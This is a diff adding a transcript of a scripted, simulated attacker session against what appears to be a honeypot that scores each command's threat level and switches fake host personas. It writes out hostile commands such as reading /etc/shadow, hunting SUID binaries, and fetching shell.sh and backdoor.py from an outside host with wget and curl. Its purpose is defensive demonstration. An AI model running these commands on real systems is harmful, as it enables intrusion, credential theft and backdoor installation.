@@ -1,0 +1,230 @@
+==============================================================================
+  SIMULATED ATTACKER SESSION TRANSCRIPT
+
+  NOTICE: SIMULATED/SCRIPTED SESSION, run by the development team to demonstrate mechanism behavior -- not a real attacker session.
+
+  Generated:  2026-06-25 09:46:58 UTC
+  Session ID: evidence-sim-001
+  Simulated attacker IP: 185.220.101.42
+  Initial persona: generic_linux
+==============================================================================
+
+  --- Phase 1: Basic Reconnaissance ───────────────────────────────
+
+  [ 1] $ whoami
+       Intent:   Attacker checks current identity
+       Category: reconnaissance            Score:  +1 ->   1/100  Level: low
+       Source:   fast_path   Latency:   44.9 ms  Persona: generic_linux
+       | ubuntu
+
+  [ 2] $ id
+       Intent:   Detailed user / group info
+       Category: reconnaissance            Score:  +1 ->   2/100  Level: low
+       Source:   fast_path   Latency:   46.9 ms  Persona: generic_linux
+       | uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),ubuntu,sudo,adm
+
+  [ 3] $ pwd
+       Intent:   Current working directory
+       Category: benign                    Score:   0 ->   2/100  Level: low
+       Source:   fast_path   Latency:   45.8 ms  Persona: generic_linux
+       | /home/ubuntu
+
+  [ 4] $ ls
+       Intent:   List home directory contents
+       Category: benign                    Score:   0 ->   2/100  Level: low
+       Source:   fast_path   Latency:   31.7 ms  Persona: generic_linux
+
+  [ 5] $ uname -a
+       Intent:   Full system identification
+       Category: reconnaissance            Score:  +3 ->   5/100  Level: low
+       Source:   fast_path   Latency:   16.0 ms  Persona: generic_linux
+       | Linux web-srv-03 5.4.0-150-generic #1 SMP x86_64 GNU/Linux
+
+  [ 6] $ hostname
+       Intent:   Hostname check
+       Category: reconnaissance            Score:  +1 ->   6/100  Level: low
+       Source:   fast_path   Latency:   62.2 ms  Persona: generic_linux
+       | web-srv-03
+
+
+  --- Phase 2: System Exploration ─────────────────────────────────
+
+  [ 7] $ cat /etc/passwd
+       Intent:   Enumerate all system users
+       Category: exploration               Score:  +6 ->  12/100  Level: low
+       Source:   fast_path   Latency:   15.4 ms  Persona: generic_linux
+       | root:x:0:0:root:/root:/bin/bash
+       | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+       | bin:x:2:2:bin:/bin:/usr/sbin/nologin
+       | sys:x:3:3:sys:/dev:/usr/sbin/nologin
+       | sync:x:4:65534:sync:/bin:/bin/sync
+       | ... (1 more lines)
+
+  [ 8] $ ps aux
+       Intent:   Full process listing
+       Category: exploration               Score: +12 ->  24/100  Level: medium
+       Source:   fast_path   Latency:  188.9 ms  Persona: generic_linux
+       | USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMA
+       | root             1  0.0  0.1 168936 13288 ?        Ss   Mar25   0:03 /sb
+       | root           412  0.0  0.4 104168  8432 ?  
+
+  [ 9] $ netstat -tlnp
+       Intent:   Check listening ports
+       Category: reconnaissance            Score:  +4 ->  28/100  Level: medium
+       Source:   fast_path   Latency:  157.3 ms  Persona: generic_linux
+       | Active Internet connections (only servers)
+       | Proto Recv-Q Send-Q Local Address           Foreign Address         Stat
+       | tcp         0      0 0.0.0.0:22              0.0.0.0:*      
+
+  [10] $ env
+       Intent:   Dump environment variables
+       Category: reconnaissance            Score:  +3 ->  31/100  Level: medium
+       Source:   fast_path   Latency:   47.7 ms  Persona: generic_linux
+       | USER=ubuntu
+       | HOME=/home/ubuntu
+       | SHELL=/bin/bash
+       | PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+       | LANG=en_US.UTF-8
+       | ... (2 more lines)
+
+  [11] $ cat /etc/hostname
+       Intent:   Verify hostname file
+       Category: exploration               Score:  +3 ->  34/100  Level: medium
+       Source:   fast_path   Latency:   62.9 ms  Persona: generic_linux
+       | web-srv-03
+
+  [12] $ ls -la /home
+       Intent:   Look for other user accounts
+       Category: exploration               Score:  +4 ->  38/100  Level: medium
+       Source:   fast_path   Latency:   30.6 ms  Persona: generic_linux
+       | total 24
+       | drwxr-xr-x  2 root     root         4096 Jun 15 08:00 .
+       | drwxr-xr-x  2 root     root         4096 Feb 10 11:24 ..
+       | drwxr-x---  2 ubuntu   ubuntu       4096 Apr 14 17:43 ubuntu
+
+  [13] $ cat ~/.bash_history
+       Intent:   Read prior command history
+       Category: benign                    Score:  +5 ->  43/100  Level: medium
+       Source:   fast_path   Latency:   30.4 ms  Persona: generic_linux
+       | ls -la
+       | sudo apt update
+       | nginx -t
+       | sudo systemctl restart nginx
+       | tail -f /var/log/nginx/access.log
+       | ... (4 more lines)
+
+
+  --- Phase 3: Privilege Escalation Attempts ──────────────────────
+
+  [14] $ sudo -l
+       Intent:   Check sudo privileges
+       Category: privilege_escalation      Score: +10 ->  53/100  Level: high
+       Source:   fast_path   Latency:   47.5 ms  Persona: dev_workstation
+       | usage: sudo -h | -K | -k | -V
+       | usage: sudo [-ABbEHnPS] [-C num] [-D directory] [-g group] [-h host] [-p
+
+       *** PERSONA SWITCH: generic_linux --> dev_workstation (triggered at score 53) ***
+
+  [15] $ cat /etc/shadow
+       Intent:   Attempt to read password hashes
+       Category: privilege_escalation      Score: +47 -> 100/100  Level: critical
+       Source:   fast_path   Latency:   15.4 ms  Persona: dev_workstation
+       | root:!:20070:0:99999:7:::
+       | daemon:*:20070:0:99999:7:::
+       | bin:*:20070:0:99999:7:::
+       | sys:*:20070:0:99999:7:::
+       | sync:*:20070:0:99999:7:::
+       | ... (3 more lines)
+
+  [16] $ cat /etc/sudoers
+       Intent:   Check sudoers configuration
+       Category: privilege_escalation      Score: +20 -> 100/100  Level: critical
+       Source:   fast_path   Latency:   16.0 ms  Persona: dev_workstation
+       | cat: /etc/sudoers: No such file or directory
+
+  [17] $ find / -perm -4000 -type f 2>/dev/null
+       Intent:   Hunt for SUID binaries
+       Category: exploration               Score: +16 -> 100/100  Level: critical
+       Source:   fast_path   Latency:  171.9 ms  Persona: dev_workstation
+       | find: '2>/dev/null': No such file or directory
+
+
+  --- Phase 4: Exfiltration / Weaponisation ───────────────────────
+
+  [18] $ wget http://10.0.0.1/shell.sh
+       Intent:   Download attacker toolkit
+       Category: exfiltration              Score: +15 -> 100/100  Level: critical
+       Source:   fast_path   Latency:   31.8 ms  Persona: dev_workstation
+       | --2026-06-25 09:46:59--  http://10.0.0.1/shell.sh
+       | Resolving 10.0.0.1 (10.0.0.1)... 93.184.216.34
+       | Connecting to 10.0.0.1 (10.0.0.1)|93.184.216.34|:443... connected.
+       | HTTP request sent, awaiting response
+
+  [19] $ curl http://10.0.0.1/backdoor.py -o /tmp/bd.py
+       Intent:   Download backdoor script
+       Category: exfiltration              Score: +15 -> 100/100  Level: critical
+       Source:   fast_path   Latency:   17.0 ms  Persona: finance_server
+       | % Total    % Received % Xferd  Average Speed   Time    Time     Time  Cu
+       |                                  Dload  Upload   Total   Spent    Left  
+       | 100  89  100  89    0     0  12345      0 --
+
+       *** PERSONA SWITCH: dev_workstation --> finance_server (triggered at score 100) ***
+
+  [20] $ ls /tmp
+       Intent:   Verify downloaded files landed
+       Category: benign                    Score:   0 -> 100/100  Level: critical
+       Source:   fast_path   Latency:   14.2 ms  Persona: finance_server
+       | bd.py
+
+  [21] $ cat /tmp/bd.py
+       Intent:   Inspect downloaded payload
+       Category: benign                    Score:   0 -> 100/100  Level: critical
+       Source:   fast_path   Latency:   31.1 ms  Persona: finance_server
+       | <!-- Downloaded from http://10.0.0.1/backdoor.py -->
+       | <html><body>It works!</body></html>
+
+
+  --- Post-Switch Verification ────────────────────────────────────
+
+  [22] $ whoami
+       Intent:   Re-check identity after persona shift
+       Category: reconnaissance            Score:  +1 -> 100/100  Level: critical
+       Source:   fast_path   Latency:   47.5 ms  Persona: finance_server
+       | ubuntu
+
+  [23] $ ps aux
+       Intent:   Process list in new persona context
+       Category: exploration               Score:  +4 -> 100/100  Level: critical
+       Source:   fast_path   Latency:  203.0 ms  Persona: finance_server
+       | USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMA
+       | root             1  0.0  0.1 168936 13288 ?        Ss   Mar25   0:03 /sb
+       | root           412  0.0  0.4 104168  8432 ?  
+
+  [24] $ ls
+       Intent:   Home directory in new persona context
+       Category: benign                    Score:   0 -> 100/100  Level: critical
+       Source:   fast_path   Latency:   48.2 ms  Persona: finance_server
+       | shell.sh
+
+==============================================================================
+  SESSION SUMMARY
+==============================================================================
+  Total commands:       24
+  Final score:          100/100
+  Final threat level:   critical
+  Final persona:        finance_server
+  Persona switches:     2
+    - generic_linux -> dev_workstation at score 53
+    - dev_workstation -> finance_server at score 100
+  Response sources:     fast_path=24  llm=0  fallback=0
+  Average latency:      59.3 ms
+
+  Score progression by phase:
+    Phase 1: Basic Reconnaissance                    0 ->   6
+    Phase 2: System Exploration                      6 ->  43
+    Phase 3: Privilege Escalation Attempts          43 -> 100
+    Phase 4: Exfiltration / Weaponisation           85 -> 100
+    Post-Switch Verification                        99 -> 100
+
+  NOTICE: SIMULATED/SCRIPTED SESSION, run by the development team to demonstrate mechanism behavior -- not a real attacker session.
+==============================================================================
